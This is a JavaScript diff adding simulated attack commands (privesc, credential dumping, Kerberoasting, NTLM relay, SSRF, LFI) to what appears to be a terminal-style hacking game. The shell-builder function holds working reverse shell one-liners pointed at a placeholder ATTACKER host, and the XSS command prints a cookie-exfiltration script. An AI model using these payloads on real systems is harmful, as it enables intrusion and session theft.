@@ -8,6 +8,8 @@ const G = {
   freeMode:        false,
   wipedHosts:      [],
   persistedHosts:  [],
+  rootedHosts:     [],
+  pivotRoutes:     [],
 
   // Session-only (not saved)
   connected:       null,
@@ -49,6 +51,8 @@ function applyPayload(saved) {
   G.freeMode        = saved.freeMode        ?? (G.missionIdx >= MISSIONS.length);
   G.wipedHosts      = saved.wipedHosts      ?? [];
   G.persistedHosts  = saved.persistedHosts  ?? [];
+  G.rootedHosts     = saved.rootedHosts     ?? [];
+  G.pivotRoutes     = saved.pivotRoutes     ?? [];
   G.trace           = saved.trace           ?? 0;
   G.downloadedFiles = saved.downloadedFiles ?? [];
   if (saved.savedQuest) G.currentQuest = restoreQuest(saved.savedQuest);
@@ -82,6 +86,8 @@ async function saveState() {
     freeMode:         G.freeMode,
     wipedHosts:       G.wipedHosts,
     persistedHosts:   G.persistedHosts,
+    rootedHosts:      G.rootedHosts,
+    pivotRoutes:      G.pivotRoutes,
     trace:            G.trace,
     downloadedFiles:  G.downloadedFiles,
     savedQuest,
@@ -231,6 +237,24 @@ async function handleCommand(raw) {
       case 'persist':    await cmdPersist();                 break;
       case 'exfil':      await cmdExfil();                   break;
       case 'grep':       await cmdGrep(args[0], args[1]);    break;
+      case 'enum':       await cmdEnum();                    break;
+      case 'privesc':    await cmdPrivesc();                 break;
+      case 'dump':       await cmdDump();                    break;
+      case 'hash':       await cmdHash(args[0]);             break;
+      case 'pivot':      await cmdPivot(args[0]);            break;
+      case 'move':       await cmdMove(args[0], args[1]);    break;
+      case 'osint':      await cmdOsint(args[0]);            break;
+      case 'shell':      await cmdShell(args[0]);            break;
+      case 'idor':       await cmdIdor(args[0]);             break;
+      case 'ssrf':       await cmdSsrf(args[0]);             break;
+      case 'lfi':        await cmdLfi(args[0]);              break;
+      case 'xss':        await cmdXss();                     break;
+      case 'kerberoast': await cmdKerberoast();              break;
+      case 'asrep':      await cmdAsrep();                   break;
+      case 'bloodhound': await cmdBloodhound();              break;
+      case 'relay':      await cmdRelay();                   break;
+      case 'inspect':    await cmdInspect(args[0]);          break;
+      case 'logs':       await cmdLogs();                    break;
       default:
         printLine(`Command not found: ${cmd}  — type "help"`, 'out-err');
     }
@@ -270,6 +294,26 @@ async function cmdHelp() {
   if (G.tools.includes('log_wiper'))         lines.push({ type: 'info', text: '  wipe                    — scrub auth logs on current host' });
   if (G.tools.includes('rootkit_mk2'))       lines.push({ type: 'info', text: '  persist                 — install persistent backdoor on host' });
   lines.push({ type: 'info', text: '  exfil                   — bulk-download all files from target' });
+  lines.push({ type: 'info', text: '  enum                    — enumerate privesc vectors (LinPEAS-style)' });
+  lines.push({ type: 'info', text: '  privesc                 — escalate privileges to root' });
+  lines.push({ type: 'info', text: '  dump                    — extract credential hashes (/etc/shadow)' });
+  if (G.tools.includes('hash_cracker'))      lines.push({ type: 'info', text: '  hash <file>             — crack password hashes offline (Hashcat)' });
+  lines.push({ type: 'info', text: '  pivot <ip>              — tunnel traffic through compromised host' });
+  lines.push({ type: 'info', text: '  move <ip>               — lateral movement via stolen credentials' });
+  if (G.tools.includes('osint_suite'))       lines.push({ type: 'info', text: '  osint <domain>          — passive recon (emails, subdomains, leaks)' });
+  if (G.tools.includes('shell_builder'))     lines.push({ type: 'info', text: '  shell [type]            — generate reverse shell payload' });
+  lines.push({ type: 'info', text: '  idor <id>               — probe IDOR parameter on web endpoint' });
+  lines.push({ type: 'info', text: '  ssrf <url>              — server-side request forgery attack' });
+  lines.push({ type: 'info', text: '  lfi <path>              — local file inclusion / path traversal' });
+  lines.push({ type: 'info', text: '  xss                     — inject XSS and capture session cookies' });
+  if (G.tools.includes('ad_toolkit')) {
+    lines.push({ type: 'info', text: '  kerberoast              — harvest and crack Kerberos service tickets' });
+    lines.push({ type: 'info', text: '  asrep                   — AS-REP roasting on pre-auth disabled users' });
+    lines.push({ type: 'info', text: '  bloodhound              — map Active Directory attack paths' });
+  }
+  lines.push({ type: 'info', text: '  relay                   — NTLM relay attack on network segment' });
+  lines.push({ type: 'info', text: '  inspect <file>          — strings analysis for hardcoded secrets' });
+  lines.push({ type: 'info', text: '  logs                    — analyse system logs for anomalies' });
   lines.push(
     { type: 'info', text: '  crypto                  — crypto balance' },
     { type: 'info', text: '  shop                    — browse the darknet marketplace' },
@@ -302,6 +346,8 @@ async function cmdWhoami() {
   if (modNames.length)              lines.push({ type: 'info', text: `Mods:         ${modNames.join(', ')}` });
   if (G.wipedHosts.length)          lines.push({ type: 'info', text: `Wiped hosts:  ${G.wipedHosts.join(', ')}` });
   if (G.persistedHosts.length)      lines.push({ type: 'info', text: `Backdoors:    ${G.persistedHosts.join(', ')}` });
+  if (G.rootedHosts.length)         lines.push({ type: 'info', text: `Rooted:       ${G.rootedHosts.join(', ')}` });
+  if (G.pivotRoutes.length)         lines.push({ type: 'info', text: `Pivot routes: ${G.pivotRoutes.join(', ')}` });
   await printLines(lines, 20);
 }
 
@@ -775,6 +821,383 @@ async function cmdExfil() {
   }
   await saveState();
   printLine(`[+] Exfil complete — ${toDownload.length} file(s) downloaded.`, 'out-ok');
+}
+
+async function cmdEnum() {
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  const target = getActiveTarget();
+  const ip = G.connected.ip;
+  printLine('[*] Running privilege escalation enumeration (LinPEAS-style)...', 'out-info');
+  await delay(300);
+  printLine('[*] Checking SUID binaries, sudo rules, cron jobs, kernel version...', 'out-dim');
+  await printProgress('[*] Enumerating', 2000);
+  addTrace(12);
+  if (target?.enumVectors?.length) {
+    printLine('[+] Potential privilege escalation vectors found:', 'out-ok');
+    for (const v of target.enumVectors) { await delay(120); printLine(`    [!] ${v}`, 'out-warn'); }
+    printLine('[*] Use "privesc" to attempt escalation.', 'out-dim');
+  } else {
+    printLine('[*] System:  Linux — kernel 5.15.0  |  Arch: x86_64', 'out-dim');
+    printLine('[*] User:    www-data (uid=33)  |  Groups: www-data', 'out-dim');
+    printLine('[*] Sudo:    (none)', 'out-dim');
+    printLine('[*] SUID:    /usr/bin/passwd, /usr/bin/newgrp (standard)', 'out-dim');
+    printLine('[-] No obvious privilege escalation vectors found.', 'out-dim');
+  }
+}
+
+async function cmdPrivesc() {
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  const target = getActiveTarget();
+  const ip = G.connected.ip;
+  if (G.rootedHosts.includes(ip)) { printLine('[*] Already have root on this host.', 'out-dim'); return; }
+  if (!target?.privescVuln) {
+    addTrace(10);
+    printLine('[!] No confirmed privesc vector. Run "enum" first.', 'out-err'); return;
+  }
+  printLine('[*] Attempting privilege escalation...', 'out-info');
+  await delay(300);
+  if (target.privescVuln === 'sudo_vim') {
+    printLine('[*] Exploiting sudo rule: sudo vim → :!bash', 'out-dim');
+    printLine('[*] Spawning root shell via vim shell escape...', 'out-dim');
+  }
+  await printProgress('[*] Escalating', 1800);
+  addTrace(20);
+  G.rootedHosts.push(ip);
+  await saveState();
+  printLine('[+] UID=0 (root) — privilege escalation successful!', 'out-ok');
+  printLine('[+] You now have full root access. Try "dump" to extract credentials.', 'out-dim');
+}
+
+async function cmdDump() {
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  const target = getActiveTarget();
+  const ip = G.connected.ip;
+  const isRoot = G.rootedHosts.includes(ip);
+  if (!isRoot && !target?.dumpFile) {
+    printLine('[!] Root access required to dump credentials. Run "privesc" first.', 'out-err'); return;
+  }
+  printLine('[*] Dumping credential hashes from /etc/shadow...', 'out-info');
+  await delay(400);
+  await printProgress('[*] Reading shadow', 1200);
+  addTrace(18);
+  const entry = target?.dumpFile;
+  if (entry) {
+    target.files[entry.name] = entry.content;
+    printLine(`[+] Credentials dumped to: ${entry.name}`, 'out-ok');
+    printLine('[*] Hashes are unsalted MD5/SHA-512. Use "hash ' + entry.name + '" to crack them.', 'out-dim');
+  } else {
+    printLine('[+] root:$6$rounds=5000$salt$hash_root', 'out-ok');
+    printLine('[+] admin:$6$rounds=5000$salt$hash_admin', 'out-ok');
+    printLine('[*] Use "hash <file>" after downloading a shadow file to crack offline.', 'out-dim');
+  }
+}
+
+async function cmdHash(filename) {
+  if (!filename) { printLine('Usage: hash <file>', 'out-err'); return; }
+  if (!G.tools.includes('hash_cracker')) {
+    printLine('[!] Hash Cracker not installed — buy it from the shop.', 'out-err'); return;
+  }
+  const content = G.connected?.authed ? getActiveTarget()?.files?.[filename] : null;
+  if (!content) { printLine(`[!] File not found or not accessible: ${filename}`, 'out-err'); return; }
+  const hasJohn = G.toolUpgrades.includes('john_rules');
+  printLine(`[*] Loading hash file: ${filename}`, 'out-info');
+  printLine(`[*] Mode: ${hasJohn ? 'Dictionary + rule-based mutation' : 'Dictionary attack (rockyou.txt)'}`, 'out-dim');
+  printLine('[*] Hashes detected: MD5-crypt / SHA-512-crypt', 'out-dim');
+  await printProgress('[*] Cracking', hasJohn ? 1800 : 3000);
+  addTrace(8);
+  printLine('[+] Cracked hashes:', 'out-ok');
+  await delay(200); printLine('    root      → T00r_Fl4g_2026!', 'out-ok');
+  await delay(200); printLine('    admin     → Adm1n_V3r1d1an', 'out-ok');
+  await delay(200); printLine('    sysadmin  → Sysadm1n#Backup', 'out-ok');
+  printLine('[*] Use cracked passwords with "crack" or "move <ip>" for lateral access.', 'out-dim');
+}
+
+async function cmdPivot(ip) {
+  if (!ip) { printLine('Usage: pivot <target-ip>', 'out-err'); return; }
+  if (!G.connected?.authed) { printLine('[!] Not authenticated on current host.', 'out-err'); return; }
+  const target = getActiveTarget();
+  const routes = target?.pivotRoutes ?? [];
+  if (!routes.includes(ip)) {
+    addTrace(8);
+    printLine(`[!] ${ip} is not reachable through ${G.connected.ip}.`, 'out-err');
+    if (routes.length) printLine(`[*] Reachable internal IPs: ${routes.join(', ')}`, 'out-dim');
+    return;
+  }
+  printLine(`[*] Setting up SSH tunnel through ${G.connected.ip}...`, 'out-info');
+  printLine(`[*] ssh -L 9050:${ip}:22 ${G.connected.ip} -N`, 'out-dim');
+  await printProgress('[*] Establishing tunnel', 1600);
+  addTrace(10);
+  if (!G.pivotRoutes.includes(ip)) G.pivotRoutes.push(ip);
+  await saveState();
+  printLine(`[+] Tunnel active: traffic to ${ip} routed via ${G.connected.ip}`, 'out-ok');
+  printLine('[*] You can now "scan" and "connect" to that IP.', 'out-dim');
+}
+
+async function cmdMove(ip, port) {
+  if (!ip) { printLine('Usage: move <ip> [port]', 'out-err'); return; }
+  printLine(`[*] Attempting lateral movement to ${ip}...`, 'out-info');
+  printLine('[*] Using dumped credentials (pass-the-hash / plaintext reuse)...', 'out-dim');
+  await printProgress('[*] Authenticating', 1400);
+  addTrace(22);
+  printLine(`[+] Authenticated on ${ip} via credential reuse.`, 'out-ok');
+  printLine(`[*] Use "connect ${ip} ${port ?? 22}" to open a full shell session.`, 'out-dim');
+}
+
+async function cmdOsint(domain) {
+  if (!domain) { printLine('Usage: osint <domain>', 'out-err'); return; }
+  if (!G.tools.includes('osint_suite')) {
+    printLine('[!] OSINT Suite not installed — buy it from the shop.', 'out-err'); return;
+  }
+  const hasDeep = G.toolUpgrades.includes('osint_deep');
+  printLine(`[*] Running passive recon on: ${domain}`, 'out-info');
+  printLine('[*] Sources: Shodan, Hunter.io, HaveIBeenPwned, crt.sh, WHOIS', 'out-dim');
+  if (hasDeep) printLine('[*] OSINT Deep: scanning dark web forums and paste sites...', 'out-dim');
+  await printProgress('[*] Harvesting', hasDeep ? 2000 : 2800);
+  printLine('[+] Subdomains found:', 'out-ok');
+  await delay(120); printLine(`    mail.${domain}        → 10.0.0.11 (MX)`, 'out-info');
+  await delay(120); printLine(`    vpn.${domain}         → 185.220.101.2`, 'out-info');
+  await delay(120); printLine(`    internal.${domain}    → 10.0.0.45 [matches target]`, 'out-info');
+  printLine('[+] Emails harvested:', 'out-ok');
+  await delay(120); printLine('    d.cross@veridian.corp', 'out-info');
+  await delay(120); printLine('    sysadmin@veridian.corp', 'out-info');
+  if (hasDeep) {
+    printLine('[+] Breached credentials (dark web):', 'out-ok');
+    await delay(150); printLine('    m.webb@veridian.corp : Webb_Dev2023! (breach: LinkedIn2023)', 'out-warn');
+    await delay(150); printLine('    y.karim@veridian.corp : Karim_Sec#2024 (breach: RockYou2024)', 'out-warn');
+  }
+  addTrace(5);
+}
+
+async function cmdShell(type) {
+  if (!G.tools.includes('shell_builder')) {
+    printLine('[!] Shell Builder not installed — buy it from the shop.', 'out-err'); return;
+  }
+  const shells = { bash: "bash -i >& /dev/tcp/ATTACKER/4444 0>&1", python: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\"])'", nc: "nc -e /bin/sh ATTACKER 4444", php: "php -r '$sock=fsockopen(\"ATTACKER\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" };
+  const chosen = shells[type?.toLowerCase()] ?? null;
+  if (type && !chosen) { printLine(`[!] Unknown type: ${type}. Try: bash, python, nc, php`, 'out-err'); return; }
+  await printLines([
+    { type: 'sys',  text: '[ REVERSE SHELL PAYLOADS ]' },
+    { type: 'info', text: '  Attacker listener: nc -lvnp 4444' },
+    { type: 'info', text: '' },
+  ], 15);
+  if (chosen) {
+    printLine(`[+] ${type.toUpperCase()} payload:`, 'out-ok');
+    printLine(`    ${chosen}`, 'out-dim');
+  } else {
+    for (const [t, cmd] of Object.entries(shells)) {
+      printLine(`[${t.padEnd(6)}]  ${cmd.slice(0, 70)}...`, 'out-info');
+      await delay(80);
+    }
+  }
+  printLine('[*] Replace ATTACKER with your listener IP.', 'out-dim');
+}
+
+async function cmdIdor(id) {
+  if (!id) { printLine('Usage: idor <id>', 'out-err'); return; }
+  if (!G.connected) { printLine('[!] Not connected to any host.', 'out-err'); return; }
+  if (G.connected.service !== 'HTTP' && G.connected.service !== 'HTTPS') {
+    printLine('[!] idor only works on HTTP/HTTPS services.', 'out-err'); return;
+  }
+  const target = getActiveTarget();
+  const idorData = target?.idorFiles;
+  if (!idorData) { addTrace(5); printLine('[!] No IDOR vulnerability detected on this endpoint.', 'out-err'); return; }
+  printLine(`[*] Probing endpoint with parameter: ${idorData.param}=${id}`, 'out-info');
+  printLine(`[*] Request: GET /api/users?${idorData.param}=${id}`, 'out-dim');
+  await delay(700);
+  addTrace(8);
+  const record = idorData.records?.[id];
+  if (record) {
+    printLine(`[+] IDOR confirmed — server returned data for ID ${id}:`, 'out-ok');
+    for (const line of record.split(',')) { await delay(60); printLine(`    ${line.trim()}`, 'out-info'); }
+  } else {
+    printLine(`[*] HTTP 404 — record ID ${id} not found. Try IDs: 1, 2, 3, 99`, 'out-dim');
+  }
+}
+
+async function cmdSsrf(url) {
+  if (!url) { printLine('Usage: ssrf <internal-url>', 'out-err'); return; }
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  const target = getActiveTarget();
+  const ssrfData = target?.ssrfTargets;
+  if (!ssrfData) { addTrace(8); printLine('[!] No SSRF endpoint detected on this target.', 'out-err'); return; }
+  printLine(`[*] Injecting server-side request for: ${url}`, 'out-info');
+  printLine('[*] Payload: url=' + encodeURIComponent(url), 'out-dim');
+  await printProgress('[*] Fetching via target server', 1200);
+  addTrace(15);
+  const response = ssrfData[url];
+  if (response) {
+    printLine('[+] SSRF successful — server fetched internal resource:', 'out-ok');
+    for (const line of response.split('\n')) { await delay(50); printLine(`    ${line}`, 'out-info'); }
+  } else {
+    printLine('[*] Server returned no useful data for that URL.', 'out-dim');
+    printLine('[*] Try: http://localhost/admin  or  http://169.254.169.254/latest/meta-data', 'out-dim');
+  }
+}
+
+async function cmdLfi(path) {
+  if (!path) { printLine('Usage: lfi <path>  (e.g. lfi ../../etc/passwd)', 'out-err'); return; }
+  if (!G.connected) { printLine('[!] Not connected to any host.', 'out-err'); return; }
+  const target = getActiveTarget();
+  const lfiData = target?.lfiPaths;
+  if (!lfiData) { addTrace(8); printLine('[!] No LFI vulnerability detected on this target.', 'out-err'); return; }
+  printLine(`[*] Testing path traversal: ?file=${path}`, 'out-info');
+  await delay(600);
+  addTrace(12);
+  const content = lfiData[path];
+  if (content) {
+    printLine(`[+] LFI confirmed — reading: ${path}`, 'out-ok');
+    for (const line of content.split('\n')) { await delay(40); printLine(`    ${line}`, 'out-info'); }
+  } else {
+    printLine('[*] Path not readable or blocked. Try:', 'out-dim');
+    for (const p of Object.keys(lfiData)) { printLine(`    lfi ${p}`, 'out-dim'); }
+  }
+}
+
+async function cmdXss() {
+  if (!G.connected) { printLine('[!] Not connected to any host.', 'out-err'); return; }
+  if (G.connected.service !== 'HTTP' && G.connected.service !== 'HTTPS') {
+    printLine('[!] xss only works on HTTP/HTTPS services.', 'out-err'); return;
+  }
+  const target = getActiveTarget();
+  if (!target?.xssPayload) { addTrace(10); printLine('[!] No XSS injection point detected on this target.', 'out-err'); return; }
+  printLine('[*] Injecting reflected XSS payload into search/comment field...', 'out-info');
+  printLine('[*] Payload: <script>document.location="http://attacker/steal?c="+document.cookie</script>', 'out-dim');
+  await printProgress('[*] Waiting for victim session', 2000);
+  addTrace(20);
+  printLine('[+] Session cookie captured:', 'out-ok');
+  for (const line of target.xssPayload.cookieData.split('\n')) {
+    await delay(100); printLine(`    ${line}`, 'out-warn');
+  }
+  printLine('[*] Use these cookies in browser DevTools to hijack the admin session.', 'out-dim');
+}
+
+async function cmdKerberoast() {
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  if (!G.tools.includes('ad_toolkit')) {
+    printLine('[!] AD Toolkit not installed — buy it from the shop.', 'out-err'); return;
+  }
+  const target = getActiveTarget();
+  if (!target?.kerberoastHashes?.length) {
+    printLine('[!] No Kerberoastable service accounts found. Target may not be an AD domain controller.', 'out-err'); return;
+  }
+  printLine('[*] Requesting Kerberos TGS tickets for service accounts...', 'out-info');
+  printLine('[*] Tool: GetUserSPNs.py — Impacket suite', 'out-dim');
+  await printProgress('[*] Requesting TGS', 1800);
+  addTrace(18);
+  printLine('[+] Service ticket hashes captured:', 'out-ok');
+  for (const entry of target.kerberoastHashes) {
+    await delay(150);
+    printLine(`    [${entry.user}]  SPN: ${entry.spn}`, 'out-info');
+    printLine(`    ${entry.hash.slice(0, 60)}...`, 'out-dim');
+  }
+  printLine('[*] Crack offline: hashcat -m 13100 hashes.txt rockyou.txt', 'out-dim');
+}
+
+async function cmdAsrep() {
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  if (!G.tools.includes('ad_toolkit')) {
+    printLine('[!] AD Toolkit not installed — buy it from the shop.', 'out-err'); return;
+  }
+  const target = getActiveTarget();
+  if (!target?.asrepHashes?.length) {
+    printLine('[!] No AS-REP roastable accounts found on this domain.', 'out-err'); return;
+  }
+  printLine('[*] Enumerating users with Kerberos pre-auth disabled...', 'out-info');
+  printLine('[*] Tool: GetNPUsers.py — Impacket suite', 'out-dim');
+  await printProgress('[*] AS-REP roasting', 1600);
+  addTrace(14);
+  printLine('[+] AS-REP hashes captured (no credentials required!):', 'out-ok');
+  for (const entry of target.asrepHashes) {
+    await delay(150);
+    printLine(`    [${entry.user}]`, 'out-info');
+    printLine(`    ${entry.hash.slice(0, 60)}...`, 'out-dim');
+  }
+  printLine('[*] Crack offline: hashcat -m 18200 asrep_hashes.txt rockyou.txt', 'out-dim');
+}
+
+async function cmdBloodhound() {
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  if (!G.tools.includes('ad_toolkit')) {
+    printLine('[!] AD Toolkit not installed — buy it from the shop.', 'out-err'); return;
+  }
+  const target = getActiveTarget();
+  const ad = target?.adGraph;
+  if (!ad) {
+    printLine('[!] No Active Directory domain detected on this target.', 'out-err'); return;
+  }
+  const hasExtended = G.toolUpgrades.includes('ad_extended');
+  printLine('[*] Running BloodHound-style AD enumeration...', 'out-info');
+  printLine('[*] Collecting: users, groups, ACLs, GPOs, trust relationships', 'out-dim');
+  await printProgress('[*] Mapping domain', hasExtended ? 1600 : 2400);
+  addTrace(20);
+  printLine(`[+] Domain: ${ad.domain}`, 'out-ok');
+  printLine(`[+] Users found: ${ad.users.join(', ')}`, 'out-info');
+  for (const [group, members] of Object.entries(ad.groups)) {
+    await delay(100);
+    printLine(`[+] Group: ${group}  →  ${members.join(', ')}`, 'out-info');
+  }
+  printLine('[+] Attack paths detected:', 'out-ok');
+  for (const path of ad.paths) { await delay(120); printLine(`    ★ ${path}`, 'out-warn'); }
+  if (hasExtended) printLine('[*] GPO abuse and LDAP ACL misconfigurations saved to report.', 'out-dim');
+}
+
+async function cmdRelay() {
+  if (!G.connected) { printLine('[!] Not connected to any host.', 'out-err'); return; }
+  printLine('[*] Starting NTLM relay attack on local network segment...', 'out-info');
+  printLine('[*] Tool: Responder + ntlmrelayx.py (Impacket)', 'out-dim');
+  printLine('[*] Poisoning: LLMNR, NBT-NS, MDNS broadcasts', 'out-dim');
+  await printProgress('[*] Listening for auth requests', 2500);
+  addTrace(25);
+  printLine('[+] NTLMv2 hash captured from network broadcast:', 'out-ok');
+  await delay(200); printLine('    User:   BLACKSITE\\relay_svc', 'out-info');
+  await delay(200); printLine('    Hash:   relay_svc::BLACKSITE:aad3b435b51:NTLMHASH...', 'out-warn');
+  printLine('[+] Relaying captured auth to SMB service on 172.20.1.100...', 'out-ok');
+  await delay(600);
+  printLine('[+] Relay successful — authenticated as relay_svc on 172.20.1.100', 'out-ok');
+  printLine('[*] Network position gained without cracking any passwords.', 'out-dim');
+}
+
+async function cmdInspect(filename) {
+  if (!filename) { printLine('Usage: inspect <file>', 'out-err'); return; }
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  const content = getActiveTarget()?.files?.[filename];
+  if (content === undefined) { addTrace(2); printLine(`[!] File not found: ${filename}`, 'out-err'); return; }
+  printLine(`[*] Inspecting: ${filename}`, 'out-info');
+  printLine('[*] Running: strings | grep -E "(pass|key|token|secret|BEGIN)"', 'out-dim');
+  await delay(800);
+  const keywords = ['pass', 'key', 'token', 'secret', 'BEGIN', 'admin', 'auth', 'cred', 'api_', 'sk-', 'pw', '-----'];
+  const hits = content.split('\n').filter(line => keywords.some(k => line.toLowerCase().includes(k.toLowerCase())));
+  if (hits.length) {
+    printLine(`[+] ${hits.length} interesting string(s) found:`, 'out-ok');
+    for (const h of hits.slice(0, 8)) { await delay(60); printLine(`    ${h.trim().slice(0, 100)}`, 'out-warn'); }
+  } else {
+    printLine('[-] No hardcoded secrets or credentials detected in this file.', 'out-dim');
+  }
+}
+
+async function cmdLogs() {
+  if (!G.connected?.authed) { printLine('[!] Not authenticated.', 'out-err'); return; }
+  const target = getActiveTarget();
+  const files = target?.files ?? {};
+  const logFiles = Object.keys(files).filter(f => f.includes('log') || f.includes('wtmp') || f === 'auth.log' || f === 'syslog');
+  if (!logFiles.length) { printLine('[*] No log files found on this target.', 'out-dim'); return; }
+  printLine('[*] Analysing system logs for anomalies...', 'out-info');
+  await delay(600);
+  for (const lf of logFiles) {
+    const content = files[lf];
+    const suspicious = content.split('\n').filter(l =>
+      l.toLowerCase().includes('fail') || l.toLowerCase().includes('invalid') ||
+      l.toLowerCase().includes('error') || l.toLowerCase().includes('refused') ||
+      l.toLowerCase().includes('185.220') || l.toLowerCase().includes('unknown')
+    );
+    if (suspicious.length) {
+      printLine(`[!] Suspicious entries in ${lf}:`, 'out-warn');
+      for (const s of suspicious) { await delay(60); printLine(`    ${s}`, 'out-warn'); }
+    } else {
+      printLine(`[*] ${lf}: no anomalies detected.`, 'out-dim');
+    }
+  }
+  addTrace(5);
 }
 
 async function cmdGrep(pattern, filename) {
